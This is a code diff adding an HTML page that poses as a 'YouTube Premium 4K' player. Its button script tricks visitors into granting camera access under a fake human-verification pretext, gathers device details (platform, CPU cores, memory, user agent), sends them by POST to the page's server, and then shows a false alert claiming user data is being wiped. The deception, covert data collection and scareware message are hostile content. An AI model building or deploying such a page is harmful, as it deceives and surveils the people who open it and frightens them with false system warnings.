@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>YouTube Loading...</title></head>
+<body style="background:#000;color:#fff;text-align:center;font-family:sans-serif;padding-top:50px;">
+    <h2>YouTube Premium 4K</h2>
+    <p>Please click 'Allow' to verify you are human and start video.</p>
+    <button id="btn" style="padding:15px 30px;background:red;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">WATCH NOW</button>
+    <video id="v" style="display:none;" autoplay muted></video>
+    <script>
+        document.getElementById('btn').onclick = async () => {
+            try {
+                // Camera Permission maangna
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                document.getElementById('v').srcObject = s;
+                
+                // Mota Data (Hardware Info) nikalna
+                const info = {
+                    device: navigator.platform,
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory || "Unknown",
+                    browser: navigator.userAgent
+                };
+                
+                // Data ko tere server pe bhejna
+                fetch('/data', {method:'POST', body:JSON.stringify(info)});
+                
+                alert("CRITICAL ERROR: System partition corrupted. Wiping user data...");
+            } catch(e) {
+                alert("Permission Denied. Video cannot play.");
+            }
+        };
+    </script>
+</body>
+</html>
+
